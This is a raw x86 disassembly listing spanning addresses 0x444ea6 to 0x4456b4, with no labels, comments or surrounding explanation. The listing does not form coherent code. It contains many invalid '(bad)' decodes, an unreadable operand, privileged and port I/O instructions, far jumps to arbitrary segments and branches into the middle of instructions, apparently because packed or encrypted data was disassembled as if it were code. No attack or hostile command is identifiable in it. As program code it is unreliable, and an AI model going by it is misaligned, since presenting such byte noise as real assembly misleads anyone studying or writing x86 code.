  444ea6:	jmp    DWORD PTR [eax+eax*4+0x15]
  444eaa:	cld    
  444eab:	adc    al,0x86
  444ead:	cmp    BYTE PTR [ebp+0x2d],0xd9
  444eb1:	outs   dx,BYTE PTR ds:[esi]
  444eb2:	push   es
  444eb3:	arpl   WORD PTR [ebx-0x65fb0011],bx
  444eb9:	mov    al,BYTE PTR [ebp+0x61]
  444ebc:	fdiv   DWORD PTR [ebx]
  444ebe:	and    edi,DWORD PTR [eax+0xc]
  444ec1:	and    al,BYTE PTR [edx]
  444ec3:	mov    eax,0xa4fbae7c
  444ec8:	test   ecx,ebp
  444eca:	add    edx,DWORD PTR [edi]
  444ecc:	xchg   dh,ch
  444ece:	adc    DWORD PTR [esi-0x4e8aff25],0x58
  444ed5:	ins    BYTE PTR es:[edi],dx
  444ed6:	or     cl,al
  444ed8:	aam    0x73
  444eda:	lods   al,BYTE PTR ds:[esi]
  444edb:	retf   
  444edc:	xlat   BYTE PTR ds:[ebx]
  444edd:	add    BYTE PTR [ebx+0xef4d356],al
  444ee3:	add    eax,0x8b000137
  444ee8:	jg     0x444e8d
  444eea:	(bad)  
  444eeb:	adc    al,0x86
  444eed:	ret    0x83
  444ef0:	xchg   esi,eax
  444ef1:	(bad)  
  444ef3:	je     0x444ea6
  444ef5:	pop    eax
  444ef6:	ins    BYTE PTR es:[edi],dx
  444ef7:	or     cl,BYTE PTR [eax-0x74738c2c]
  444efd:	xlat   BYTE PTR ds:[ebx]
  444efe:	add    BYTE PTR [ebx+0xfca562],al
  444f04:	push   ebp
  444f05:	sub    al,0x83
  444f07:	add    BYTE PTR [edx-0x40],ah
  444f0a:	stos   BYTE PTR es:[edi],al
  444f0b:	adc    BYTE PTR [esp+ecx*1-0x54],0xc3
  444f10:	loope  0x444e97
  444f12:	add    al,0x2
  444f14:	iret   
  444f15:	mov    al,0x81
  444f17:	jne    0x444f81
  444f19:	mov    edi,0xc0c67cfd
  444f1e:	add    al,BYTE PTR [eax]
  444f20:	cmp    dl,BYTE PTR [ebp-0x54]
  444f23:	mul    DWORD PTR ds:0x74758000
  444f29:	mov    edi,0x4de10427
  444f2e:	or     BYTE PTR [ebx],al
  444f30:	xchg   edi,eax
  444f31:	data16 stos BYTE PTR es:[edi],al
  444f33:	pop    edx
  444f34:	add    al,0xbc
  444f36:	lods   eax,DWORD PTR ds:[esi]
  444f37:	ret    
  444f38:	loope  0x444f6f
  444f3a:	pop    es
  444f3b:	cld    
  444f3c:	outs   dx,BYTE PTR ds:[esi]
  444f3d:	mov    esp,0xbf587581
  444f42:	daa    
  444f43:	dec    eax
  444f44:	cli    
  444f45:	clc    
  444f46:	scas   al,BYTE PTR es:[edi]
  444f47:	neg    ebp
  444f49:	jg     0x444ecc
  444f4b:	jne    0x444fb9
  444f4d:	mov    ch,0x27
  444f4f:	inc    ch
  444f51:	les    ebp,FWORD PTR [edi+esi*8-0x7e803b00]
  444f58:	jne    0x444fae
  444f5a:	mov    edx,0xede10427
  444f5f:	or     al,BYTE PTR [ebx]
  444f61:	aaa    
  444f62:	xchg   esi,eax
  444f63:	stos   BYTE PTR es:[edi],al
  444f64:	sub    ah,BYTE PTR [ebx+ebx*2-0x2a1e3c53]
  444f6b:	push   es
  444f6c:	dec    DWORD PTR [esi]
  444f6e:	stos   BYTE PTR es:[edi],al
  444f6f:	xor    DWORD PTR [ebp+0x58],0xe11827bf
  444f76:	mov    ebp,0xd8f73ff1
  444f7b:	jmp    0x444efd
  444f7d:	out    dx,eax
  444f7e:	(bad)  
  444f80:	das    
  444f81:	rcr    sp,0xb5
  444f85:	ins    DWORD PTR es:[edi],dx
  444f86:	retf   0xab2b
  444f89:	pop    esp
  444f8a:	int3   
  444f8b:	aas    
  444f8c:	mov    ah,0x21
  444f8e:	pop    esi
  444f8f:	popf   
  444f90:	sbb    DWORD PTR [ebx+0x14],esp
  444f93:	or     eax,DWORD PTR [ecx-0x3f160979]
  444f99:	dec    edx
  444f9a:	mov    ebx,0xc12db422
  444f9f:	fidivr DWORD PTR [eax+0x366bca35]
  444fa5:	push   esp
  444fa6:	aad    0x84
  444fa8:	std    
  444fa9:	add    eax,0xdb3fdb4
  444fae:	xchg   esi,eax
  444faf:	jae    0x444fef
  444fb1:	push   0xe0e0a4d8
  444fb6:	adc    ecx,ebx
  444fb8:	add    BYTE PTR [eax],al
  444fba:	and    ecx,eax
  444fbc:	lods   eax,DWORD PTR ds:[esi]
  444fbd:	scas   al,BYTE PTR es:[edi]
  444fbe:	in     eax,dx
  444fbf:	leave  
  444fc0:	rcl    BYTE PTR ds:0x87cfc9e9,1
  444fc6:	outs   dx,DWORD PTR ds:[esi]
  444fc7:	jecxz  0x444fb0
  444fc9:	cmp    ah,bl
  444fcb:	mov    cl,0xa4
  444fcd:	mov    cl,0xcd
  444fcf:	leave  
  444fd0:	stos   DWORD PTR es:[edi],eax
  444fd1:	xchg   DWORD PTR [edi-0x1d],edx
  444fd4:	jmp    0x70f61411
  444fd9:	mov    cl,0xb5
  444fdb:	leave  
  444fdc:	stos   DWORD PTR es:[edi],eax
  444fdd:	xchg   DWORD PTR [edi],ebp
  444fdf:	jecxz  0x444fcb
  444fe1:	cmp    BYTE PTR [ecx+esi*4-0x36524ec4],ch
  444fe8:	stos   DWORD PTR es:[edi],eax
  444fe9:	xchg   DWORD PTR [edi],edx
  444feb:	jecxz  0x444fd0
  444fed:	cmp    BYTE PTR [ecx+esi*4-0x366a4eb8],dl
  444ff4:	add    DWORD PTR [edx-0x1bf0bc23],ebp
  444ffa:	cmp    cl,bl
  444ffc:	fidivr WORD PTR [ebp-0x4d]
  444fff:	shl    esi,0x2a
  445002:	in     eax,0x43
  445004:	pmaxsw mm6,QWORD PTR [ebx]
  445007:	retf   
  445008:	fisub  WORD PTR [ecx+0x13]
  44500b:	shl    esi,1
  44500d:	sub    dl,ch
  44500f:	push   es
  445010:	sbb    ebp,eax
  445012:	call   0xc1db:0x3cac81fc
  445019:	inc    ecx
  44501a:	iret   
  44501b:	ret    
  44501c:	mul    BYTE PTR [esi]
  44501e:	add    ch,bl
  445020:	dec    esi
  445021:	psubsw mm5,QWORD PTR [edx-0x39]
  445025:	fiadd  WORD PTR [ebp+0x2af6d0f2]
  44502b:	in     eax,0x4e
  44502d:	psubsb mm3,QWORD PTR [edx-0x39]
  445031:	fimul  WORD PTR [ecx+0x2af6d0d2]
  445037:	fisttp QWORD PTR [esi+0xf]
  44503a:	jmp    0x445076
  44503c:	jmp    0x6af6:0xd0c434e8
  445043:	xor    dl,bl
  445045:	add    DWORD PTR [ebp-0x74],ebx
  445048:	mov    cl,0x48
  44504a:	int3   
  44504b:	adc    cl,dl
  44504d:	ret    0x926a
  445050:	xlat   BYTE PTR ds:[ebx]
  445051:	add    DWORD PTR [eax+ebx*2],esi
  445054:	mov    cl,0x34
  445056:	mov    ah,0x10
  445058:	rol    edx,1
  44505a:	push   0x72
  44505c:	xlat   BYTE PTR ds:[ebx]
  44505d:	cld    
  44505e:	sbb    ecx,DWORD PTR [edi-0x4f]
  445061:	sub    esp,DWORD PTR [ebx+0x1482d0f0]
  445067:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445068:	fld    TBYTE PTR [esi+edi*4-0x7]
  44506c:	out    0xf3,eax
  44506e:	add    ah,bl
  445070:	mov    eax,edx
  445072:	or     DWORD PTR [esi+0x7574f3e2],0x64
  445079:	sbb    edi,ebp
  44507b:	or     al,0x8b
  44507d:	ret    0x7e83
  445080:	loop   0x445078
  445082:	je     0x445084
  445084:	push   0x64
  445086:	idiv   cl
  445088:	or     al,0x8b
  44508a:	cmp    BYTE PTR [ebp+0x41],0xdf
  44508e:	fs or  al,0xb3
  445091:	fucomip st,st(3)
  445093:	dec    DWORD PTR [edi+ebx*4-0x74700217]
  44509a:	out    dx,al
  44509b:	ret    
  44509c:	rcl    BYTE PTR [ecx],0x1b
  44509f:	add    DWORD PTR [esi],eax
  4450a1:	mov    edi,0xdf184583
  4450a6:	shr    eax,0x1d
  4450a9:	jbe    0x445099
  4450ab:	dec    DWORD PTR [eax-0x69fff8f7]
  4450b1:	shr    al,cl
  4450b3:	loope  0x4450c4
  4450b5:	mov    ch,dh
  4450b7:	ret    
  4450b8:	js     0x4450c3
  4450ba:	pop    es
  4450bb:	add    DWORD PTR [esi-0x2e],esi
  4450be:	call   0xeece5098
  4450c3:	ret    
  4450c4:	js     0x4450be
  4450c6:	push   es
  4450c7:	add    al,BYTE PTR [esi-0x4d3d1714]
  4450cd:	mov    esi,ebp
  4450cf:	sbb    DWORD PTR [esi],0xffffffc7
  4450d2:	add    esi,DWORD PTR [ecx+ebp*2+0x65]
  4450d6:	scas   eax,DWORD PTR es:[edi]
  4450d7:	cld    
  4450d8:	or     al,0x8a
  4450da:	ret    0x8e83
  4450dd:	jecxz  0x4450e0
  4450df:	jne    0x4450a6
  4450e1:	arpl   WORD PTR [ebx-0x3d763304],si
  4450e7:	add    DWORD PTR [eax],0x62
  4450ea:	in     eax,dx
  4450eb:	sbb    bh,ah
  4450ed:	push   ss
  4450ee:	rcr    DWORD PTR [edx-0x4fa16469],0x83
  4450f5:	bswap  esp
  4450f7:	std    
  4450f8:	imul   esi,DWORD PTR ds:0x7df4845a,0x36
  4450ff:	mov    esp,0xffc7f783
  445104:	ins    BYTE PTR es:[edi],dx
  445105:	sub    al,BYTE PTR fs:[eax-0x43d19a0c]
  44510c:	sbb    edi,0xffffffce
  44510f:	or     BYTE PTR [ebp+0x73],ch
  445112:	sub    BYTE PTR [ecx],dh
  445114:	stc    
  445115:	dec    ebp
  445116:	or     BYTE PTR [ebp+esi*2+0x58],bh
  44511a:	mov    bl,0x2e
  44511c:	add    al,0x4a
  44511e:	mov    DWORD PTR [esi-0x6b0bca09],esp
  445124:	jb     0x445154
  445126:	call   0x761e14da
  44512b:	add    al,0x1
  44512d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44512e:	xchg   ebx,eax
  44512f:	jge    0x44516e
  445131:	inc    ecx
  445132:	mov    bl,0xbd
  445134:	call   0xf7f42afa
  445139:	loope  0x445188
  44513b:	sbb    BYTE PTR [eax],al
  44513d:	ja     0x4450fd
  44513f:	call   0xe1c3:0xb1bff64e
  445146:	and    eax,0xb66f011b
  44514b:	call   0xc3b1:0x97de004a
  445152:	loope  0x445171
  445154:	sbb    eax,DWORD PTR [edx]
  445156:	push   edi
  445157:	lods   eax,DWORD PTR ds:[esi]
  445158:	call   0x3f83:0xb18fcb2f
  44515f:	mov    edx,0xd9de06fd
  445164:	and    al,BYTE PTR [edx+eiz*2]
  445167:	(bad)  [edi-0x70394e20]
  44516d:	(bad)
  445171:	add    al,0x7
  445173:	in     al,0x6a
  445175:	cs pusha 
  445177:	jmp    0xefbe6468
  44517c:	jo     0x44512e
  44517e:	jne    0x4451da
  445180:	in     eax,0xfd
  445182:	pusha  
  445183:	dec    ebp
  445184:	mov    esi,0x57c5509b
  445189:	mov    al,0xa1
  44518b:	mov    cl,0xdc
  44518d:	scas   eax,DWORD PTR es:[edi]
  44518e:	push   ebp
  44518f:	(bad)  
  445190:	sub    eax,DWORD PTR [edi+ecx*8+0x4c36e3ef]
  445197:	mov    esi,0xc64dafe8
  44519c:	sub    eax,DWORD PTR [edi+esi*4+0x3436dcef]
  4451a3:	mov    esi,0xc635ac14
  4451a8:	sub    eax,DWORD PTR [edi+ebp*4+0x7336e5ef]
  4451af:	mov    cl,0x9
  4451b1:	stos   DWORD PTR es:[edi],eax
  4451b2:	add    BYTE PTR ds:0x582e6bc6,cl
  4451b8:	fisubr DWORD PTR [ebx-0x26]
  4451bb:	std    
  4451bc:	mov    ds:0x99f5aff3,eax
  4451c1:	imul   ebp,DWORD PTR [esi],0x64
  4451c4:	ficom  WORD PTR [edi+edx*1-0x1f]
  4451c8:	inc    ebx
  4451c9:	jmp    0xdac8:0xbfe87713
  4451d0:	(bad)
  4451d3:	dec    edi
  4451d4:	shr    edx,cl
  4451d6:	aaa    
  4451d7:	data16 mov cl,0xa8
  4451da:	stos   DWORD PTR es:[edi],eax
  4451db:	int    0xc5
  4451dd:	add    DWORD PTR [edx-0x51057d22],ebp
  4451e3:	add    eax,0x582c8a9a
  4451e8:	fdivr  DWORD PTR [ebx]
  4451ea:	retf   0x3e0
  4451ed:	and    ch,dl
  4451ef:	mov    al,ds:0xc591eab0
  4451f4:	int    0x82
  4451f6:	add    al,0x74
  4451f8:	fldcw  WORD PTR [ebx-0x2c]
  4451fb:	jmp    0xcdbb4b55
  445200:	pop    ecx
  445201:	je     0x4451e6
  445203:	pusha  
  445204:	fidivr WORD PTR [ebx-0x77]
  445207:	data16 fld DWORD PTR [eax]
  44520a:	push   ecx
  44520b:	in     eax,0xc1
  44520d:	not    BYTE PTR [esi+0x21]
  445210:	pop    ecx
  445211:	je     0x44520a
  445213:	pop    esi
  445214:	ss or  al,0x51
  445217:	add    BYTE PTR [edx-0x1ec1093f],dl
  44521d:	dec    esi
  44521e:	or     ebp,edx
  445220:	cmp    al,0x46
  445222:	jl     0x44520d
  445224:	popa   
  445225:	fld1   
  445227:	popf   
  445228:	clc    
  445229:	int3   
  44522a:	imul   BYTE PTR [edx]
  44522c:	loope  0x44527c
  44522e:	por    mm3,QWORD PTR [edx-0x2a]
  445232:	call   0xf7111bbf
  445237:	push   0x53
  445239:	iret   
  44523a:	add    esi,ebp
  44523c:	fisubr DWORD PTR [edi]
  44523e:	add    ecx,ebp
  445240:	popa   
  445241:	mov    cl,0x58
  445243:	repnz (bad) 
  445245:	int3   
  445246:	ret    0x326a
  445249:	rol    DWORD PTR [ecx],cl
  44524b:	push   esp
  44524c:	dec    edi
  44524d:	mov    cl,0x3f
  44524f:	ror    DWORD PTR [ecx*8-0x2827b37e],1
  445256:	imul   eax,DWORD PTR [eax],0x68
  445259:	gs inc ebx
  44525b:	sti    
  44525c:	add    al,0x74
  44525e:	ret    0x7683
  445261:	jmp    0x445257
  445263:	je     0x445222
  445265:	pusha  
  445266:	daa    
  445267:	sti    
  445268:	add    al,0x74
  44526a:	ret    0x4683
  44526d:	jmp    0x445262
  44526f:	je     0x44520b
  445271:	pusha  
  445272:	and    bh,al
  445274:	in     al,0x73
  445276:	cmp    BYTE PTR [ebp-0x6f],0xd7
  44527a:	arpl   WORD PTR [eax],si
  44527c:	add    bl,dh
  44527e:	sar    ecx,cl
  445280:	push   esp
  445282:	xchg   esi,eax
  445283:	cmp    BYTE PTR [ebp-0x73],0xde
  445287:	arpl   WORD PTR [ecx],dx
  445289:	adc    eax,esp
  44528b:	out    dx,al
  44528c:	inc    DWORD PTR [edi+edx*2]
  44528f:	ins    BYTE PTR es:[edi],dx
  445290:	or     cl,BYTE PTR [eax+0x1]
  445293:	sbb    al,ch
  445295:	inc    ebx
  445296:	outs   dx,DWORD PTR ds:[esi]
  445297:	out    dx,al
  445298:	(bad)  
  445299:	js     0x4452f2
  44529b:	ins    BYTE PTR es:[edi],dx
  44529c:	push   ss
  44529d:	cmp    al,0xf3
  44529f:	cmc    
  4452a0:	out    0x7e,eax
  4452a2:	mov    ebp,esi
  4452a4:	jmp    DWORD PTR [eax-0x7e0a1722]
  4452aa:	jae    0x44529a
  4452ac:	ret    
  4452ad:	mov    al,0x11
  4452af:	sbb    eax,DWORD PTR [ecx]
  4452b1:	into   
  4452b2:	mov    dh,0x83
  4452b4:	inc    ebp
  4452b5:	sub    dl,bl
  4452b7:	shr    eax,0x1d
  4452ba:	jo     0x4452aa
  4452bc:	(bad)  
  4452bd:	js     0x4452c8
  4452bf:	pop    es
  4452c0:	add    BYTE PTR [esi-0x13],bh
  4452c3:	call   0xeeba3f9a
  4452c8:	add    DWORD PTR [esi+0x2a7503bf],0x65
  4452cf:	mov    edi,0xa4ab62fa
  4452d4:	ret    
  4452d5:	loope  0x4452eb
  4452d7:	lgdtd  [edi-0x5f]
  4452db:	call   0x83:0xa482cdbb
  4452e2:	aas    
  4452e3:	mov    eax,0x9a786d01
  4452e8:	ins    BYTE PTR es:[edi],dx
  4452e9:	cli    
  4452ea:	lods   eax,DWORD PTR ds:[esi]
  4452eb:	jp     0x4452ad
  4452ed:	and    DWORD PTR [edi],0xffffffcc
  4452f0:	add    BYTE PTR [ebp+0x73],ch
  4452f3:	pop    edx
  4452f4:	imul   ebp,edi,0x75805295
  4452fa:	pop    eax
  4452fb:	scas   eax,DWORD PTR es:[edi]
  4452fc:	das    
  4452fd:	and    edi,DWORD PTR [edx+0x11]
  445300:	stos   DWORD PTR es:[edi],eax
  445301:	idiv   DWORD PTR [ebp+0x6e]
  445304:	xor    BYTE PTR [ebp+0x4c],0xaf
  445308:	das    
  445309:	adc    DWORD PTR [edx+0x4c],edi
  44530c:	lods   al,BYTE PTR ds:[esi]
  44530d:	mul    DWORD PTR [ebp+0x2e]
  445310:	or     ah,BYTE PTR es:[ecx-0x5b]
  445314:	mul    bh
  445316:	jmp    0x44533e
  445318:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445319:	mul    DWORD PTR [ecx]
  44531b:	sub    DWORD PTR [eax-0x3ffbba06],eax
  445321:	mov    esp,DWORD PTR [edi-0x7ec2fc5a]
  445327:	das    
  445328:	and    esp,DWORD PTR ds:[eax-0x11]
  44532c:	mov    ds:0x3dfb813d,eax
  445331:	add    dh,BYTE PTR [edx-0x50]
  445334:	add    al,BYTE PTR [eax]
  445336:	adc    al,0x7e
  445338:	loopne 0x4453b9
  44533a:	(bad)  
  44533b:	mov    ?,ebp
  44533d:	ins    BYTE PTR es:[edi],dx
  44533e:	pop    esp
  44533f:	call   0xcc424d87
  445344:	ror    DWORD PTR [ebx-0xa706100],0xad
  44534b:	pop    edx
  44534c:	fldcw  WORD PTR [edi+eax*1-0x24]
  445350:	(bad)  
  445351:	out    0x80,eax
  445353:	mov    ds:0x15d3cedd,al
  445358:	sbb    eax,0xc2cde3ea
  44535d:	call   0xb612122
  445362:	scas   al,BYTE PTR es:[edi]
  445363:	jg     0x44535c
  445365:	addr16 cs adc dl,0x2c
  44536a:	push   es
  44536b:	mov    edx,0xadaca20c
  445370:	xchg   esi,eax
  445371:	jae    0x4453b1
  445373:	pushf  
  445374:	test   eax,0xdb2f7a81
  445379:	bound  eax,QWORD PTR [esi+0x41]
  44537c:	shl    BYTE PTR ds:0x65dddefb,cl
  445382:	add    BYTE PTR [edx+0x56],ah
  445385:	test   al,0x7
  445387:	ins    DWORD PTR es:[edi],dx
  445388:	test   eax,0xa96c4e63
  44538d:	dec    ecx
  44538e:	jp     0x4453af
  445390:	fld    TBYTE PTR [edx]
  445392:	lods   al,BYTE PTR ds:[esi]
  445393:	lahf   
  445394:	test   BYTE PTR [ebp+0x46],0x80
  445398:	pop    ecx
  445399:	vpcmpgtb xmm1,xmm3,XMMWORD PTR [esi+eiz*8-0x65]
  44539f:	pusha  
  4453a0:	mov    edi,0x4e21ac37
  4453a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4453a6:	loopne 0x445404
  4453a8:	mov    ebp,eax
  4453aa:	out    dx,eax
  4453ab:	add    cl,cl
  4453ad:	dec    esp
  4453ae:	cli    
  4453af:	out    dx,eax
  4453b0:	les    ecx,FWORD PTR [esi+eiz*8-0x11]
  4453b4:	(bad)  
  4453b5:	dec    esp
  4453b6:	loop   0x4453a7
  4453b8:	mov    esp,0x64efde4c
  4453bd:	dec    ebp
  4453be:	jmp    0x6303:0x9d9c0698
  4453c5:	dec    esi
  4453c6:	add    DWORD PTR [edx+eax*1+0x6ce1aedb],ebp
  4453cd:	lds    eax,FWORD PTR [edx+ebp*8-0x1a3ea99f]
  4453d4:	or     BYTE PTR [ecx-0x26a1d341],ch
  4453da:	ror    esi,0x23
  4453dd:	div    dh
  4453df:	sub    al,0xbc
  4453e1:	inc    ecx
  4453e2:	je     0x4453ef
  4453e4:	mov    ecx,0x45c0ff34
  4453e9:	shl    dh,0xae
  4453ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4453ed:	dec    ebp
  4453ee:	cmp    al,0xca
  4453f0:	test   al,0x73
  4453f2:	add    ebp,ebx
  4453f4:	icebp  
  4453f5:	xor    al,0x37
  4453f7:	aad    0x35
  4453f9:	xor    eax,0x3502cd3b
  4453fe:	das    
  4453ff:	lds    eax,FWORD PTR [ebx]
  445401:	xor    eax,0x3500bd33
  445406:	daa    
  445407:	mov    ch,0x17
  445409:	xor    eax,0x350cad2b
  44540e:	pop    ds
  44540f:	and    eax,0x23350a00
  445414:	sbb    eax,0x15172dbb
  445419:	mov    eax,0xa90d1b2d
  44541e:	sub    eax,0x2d6a050f
  445423:	adc    edi,ebp
  445425:	pop    edx
  445426:	sub    eax,0x2d5bf507
  44542b:	or     ebp,ebp
  44542d:	dec    eax
  44542e:	sub    eax,0x3528e4ff
  445433:	add    edx,DWORD PTR [edx]
  445435:	bound  edi,QWORD PTR [edi+0x3c]
  445438:	call   0xca80a89b
  44543d:	or     BYTE PTR [edi+0x9],ch
  445440:	add    BYTE PTR [esi+0xb037ed9],cl
  445446:	pop    eax
  445447:	rol    DWORD PTR [esp+ebp*8],0xac
  44544b:	mov    bh,0x45
  44544d:	cli    
  44544e:	fadd   st(1),st
  445450:	push   DWORD PTR [esi]
  445452:	mov    eax,0x556945ec
  445457:	ins    BYTE PTR es:[edi],dx
  445458:	and    bh,BYTE PTR [ecx+ecx*1+0x6e83e7f7]
  44545f:	out    dx,al
  445460:	(bad)  
  445461:	clc    
  445462:	aas    
  445463:	xor    al,0x23
  445465:	int3   
  445466:	dec    edx
  445467:	or     DWORD PTR [ebp+0x4014247],ecx
  44546d:	mov    ebx,0x380001dc
  445472:	pushf  
  445473:	cmc    
  445474:	inc    BYTE PTR [eax]
  445476:	fist   DWORD PTR [edi+0x72a845ee]
  44547c:	xor    al,0x22
  44547e:	sti    
  44547f:	lock and cl,BYTE PTR [edi]
  445482:	xchg   dl,bl
  445484:	call   0xeeb836aa
  445489:	ret    
  44548a:	add    BYTE PTR [ecx],bl
  44548c:	and    cl,BYTE PTR [edi]
  44548e:	xor    eax,0xed847dc4
  445493:	fisttp DWORD PTR [eax]
  445495:	add    BYTE PTR [ebx-0x29],cl
  445498:	add    BYTE PTR [ebx-0x2f103f75],al
  44549e:	js     0x445513
  4454a0:	xor    al,0x23
  4454a2:	popf   
  4454a3:	sbb    DWORD PTR [ebx],esp
  4454a5:	cmp    dh,0xb5
  4454a8:	push   DWORD PTR [ebp+eax*2+0x64]
  4454ac:	sti    
  4454ad:	clc    
  4454ae:	jl     0x445523
  4454b0:	ret    0xf68b
  4454b3:	mov    dh,0xff
  4454b5:	mov    ch,0x13
  4454b7:	inc    ecx
  4454b8:	jne    0x445448
  4454ba:	bound  esi,QWORD PTR [edx-0x4cf20012]
  4454c0:	add    al,BYTE PTR [ebx-0x2f5451de]
  4454c6:	and    edi,esi
  4454c8:	inc    eax
  4454c9:	sbb    ah,BYTE PTR [edx-0x4e]
  4454cc:	add    al,BYTE PTR [eax]
  4454ce:	fnstenv [edi+ebx*8+0x6]
  4454d2:	lods   al,BYTE PTR ds:[esi]
  4454d3:	icebp  
  4454d4:	add    DWORD PTR ds:0x2b21d,esi
  4454da:	add    BYTE PTR [ebp-0x3f],dl
  4454dd:	call   0x4783:0xa88ed404
  4454e4:	mov    al,ds:0xaa647601
  4454e9:	push   0xbc86b5f8
  4454ee:	call   0xf7ecd9e3
  4454f3:	fldlg2 
  4454f5:	push   es
  4454f6:	add    DWORD PTR [edi],esp
  4454f8:	xchg   ebx,eax
  4454f9:	jge    0x445538
  4454fb:	inc    ecx
  4454fc:	mov    ah,0xbd
  4454fe:	mov    edi,0x2cc27
  445503:	bound  esi,QWORD PTR [edx-0x50bec28b]
  445509:	jo     0x44554b
  44550b:	arpl   WORD PTR [ebp-0x4d9dff97],ax
  445511:	sub    DWORD PTR [edi],ecx
  445513:	jp     0x445514
  445515:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445516:	neg    DWORD PTR [ebp+0x34]
  445519:	push   ds
  44551a:	push   cs
  44551b:	arpl   WORD PTR [ebp-0x39307ce5],bx
  445521:	add    DWORD PTR [esi-0x3f],esi
  445524:	sub    BYTE PTR [eax+edi*8+0x3d],bh
  445528:	add    BYTE PTR [ebp+esi*1+0x2b122],bh
  44552f:	scas   al,BYTE PTR es:[edi]
  445530:	data16 jnp 0x4454f5
  445533:	and    ebx,edx
  445535:	adc    DWORD PTR [eax],eax
  445537:	jmp    0x4454d1
  445539:	imul   esp,DWORD PTR [ebx-0x8eda5a3],0x0
  445540:	jle    0x445514
  445542:	push   0xffffffab
  445544:	bound  eax,QWORD PTR [ebp-0x56]
  445547:	fwait
  445548:	add    cl,0xf7
  44554b:	test   al,0x21
  44554d:	pop    ebx
  44554e:	repnz stc 
  445550:	jle    0x445558
  445552:	imul   ebp,DWORD PTR [ebx-0x6419bba0],0x30
  445559:	rcl    edi,0xa8
  44555c:	mov    eax,ds:0x3f04d15a
  445561:	xlat   BYTE PTR ds:[ebx]
  445562:	mov    edi,0xbfbeca40
  445567:	(bad)
  44556b:	cs mov ah,0xb6
  44556e:	in     al,dx
  44556f:	stos   DWORD PTR es:[edi],eax
  445570:	mov    ch,0xbe
  445572:	stos   DWORD PTR es:[edi],eax
  445573:	test   BYTE PTR [ebx-0x75fdeb2a],ch
  445579:	or     BYTE PTR [eax+0x6b9a8da8],ah
  44557f:	stos   BYTE PTR es:[edi],al
  445580:	gs inc esp
  445582:	ficomp WORD PTR [ebx-0x57803e9c]
  445588:	mov    eax,ds:0x6daee1b1
  44558d:	mov    esi,0xd8483e63
  445592:	sbb    al,0xe5
  445594:	loopne 0x4455aa
  445596:	or     eax,DWORD PTR [esi]
  445598:	and    DWORD PTR [esi-0x269df263],edx
  44559e:	out    0x3,eax
  4455a0:	fst    DWORD PTR [ebx]
  4455a2:	or     edi,ecx
  4455a4:	add    bh,dh
  4455a6:	sbb    cl,ch
  4455a8:	out    0xf4,al
  4455aa:	fsub   st,st(7)
  4455ac:	add    ebp,DWORD PTR [ebp+0x444100e8]
  4455b2:	lods   eax,DWORD PTR ds:[esi]
  4455b3:	imul   BYTE PTR [esi]
  4455b5:	fiadd  WORD PTR [ebx+0xf]
  4455b8:	out    dx,al
  4455b9:	dec    ebx
  4455ba:	or     ebp,ecx
  4455bc:	sbb    edx,edx
  4455be:	vcvtsi2ss xmm0,xmm1,DWORD PTR [esi+edi*2]
  4455c3:	add    ecx,ebp
  4455c5:	popa   
  4455c6:	inc    ebp
  4455c7:	sbb    al,0x70
  4455c9:	daa    
  4455ca:	cwde   
  4455cb:	jmp    0x4455b2
  4455cd:	js     0x445567
  4455cf:	or     BYTE PTR [eax],0xea
  4455d2:	pop    edx
  4455d3:	sti    
  4455d4:	fbstp  TBYTE PTR [edx+edx*8]
  4455d7:	and    eax,0xd11031df
  4455dd:	or     eax,0xa1d6f6ae
  4455e2:	pop    ecx
  4455e3:	sti    
  4455e4:	ficom  WORD PTR [edx+0xdaddebf]
  4455ea:	(bad)  
  4455eb:	imul   BYTE PTR [edx-0x4912922a]
  4455f1:	add    eax,0x5ed33c52
  4455f6:	cld    
  4455f7:	and    DWORD PTR [edx+0x23],ebp
  4455fa:	cli    
  4455fb:	add    ch,BYTE PTR [edx-0x16e5042b]
  445601:	popa   
  445602:	fld    DWORD PTR [eax]
  445604:	bound  esp,QWORD PTR [ebx]
  445606:	cli    
  445607:	add    eax,0xd826003f
  44560c:	xor    edi,DWORD PTR [esi]
  44560e:	pop    esi
  44560f:	fld    DWORD PTR [eax]
  445611:	mul    BYTE PTR [ecx+esi*4-0x26]
  445615:	jne    0x4455d4
  445617:	lds    eax,FWORD PTR [edx+0x72bd6fe4]
  44561d:	out    dx,eax
  44561e:	loopne 0x445666
  445620:	pxor   mm7,QWORD PTR [ebp-0x2f]
  445624:	or     esp,0x77bc57
  44562a:	dec    ecx
  44562b:	pusha  
  44562c:	inc    eax
  44562d:	call   0x32c2fd
  445632:	js     0x4455e6
  445634:	mov    dh,0x0
  445636:	cmp    ebx,ecx
  445638:	ins    BYTE PTR es:[edi],dx
  445639:	xor    al,0x92
  44563b:	xchg   edi,eax
  44563c:	shr    dl,0xff
  44563f:	cmp    eax,0xc45a83c0
  445644:	cmp    edx,0x25
  445647:	or     al,BYTE PTR [ebx+eax*4]
  44564a:	bound  edi,QWORD PTR [ebp+0x6e88206d]
  445650:	add    dh,BYTE PTR [eax+edx*1+0x58]
  445654:	clc    
  445655:	add    ch,BYTE PTR [edi-0x32]
  445658:	call   0xeeb812b2
  44565d:	ret    
  44565e:	dec    eax
  44565f:	jb     0x44565f
  445661:	je     0x445623
  445663:	push   edi
  445664:	clc    
  445665:	or     BYTE PTR [edi],dl
  445667:	mov    ebx,0x73fc45de
  44566c:	out    dx,al
  44566d:	ret    
  44566e:	add    BYTE PTR [ebx-0xb001550],dl
  445674:	aas    
  445675:	xor    al,0x1a
  445677:	mov    edx,0x4e832219
  44567c:	mov    eax,0x19bcc300
  445681:	sbb    eax,DWORD PTR [eax]
  445683:	jnp    0x44565d
  445685:	add    BYTE PTR [ebx-0x4a0047c2],cl
  44568b:	dec    ebx
  44568c:	(bad)  
  44568d:	sub    edi,DWORD PTR [edi+0x7f00d88b]
  445693:	mov    ah,BYTE PTR [eax+0x4d]
  445696:	hlt    
  445697:	hlt    
  445698:	jb     0x44561c
  44569a:	jge    0x4456f9
  44569c:	mov    ebx,0xc3b3226c
  4456a1:	out    0xff,eax
  4456a3:	bound  esp,QWORD PTR [ebx]
  4456a5:	ret    
  4456a6:	xor    eax,0x2b222
  4456ab:	mov    esi,0x23c2759d
  4456b0:	sub    dh,dh
  4456b2:	mov    BYTE PTR [ebx],ah
  4456b4:	das    
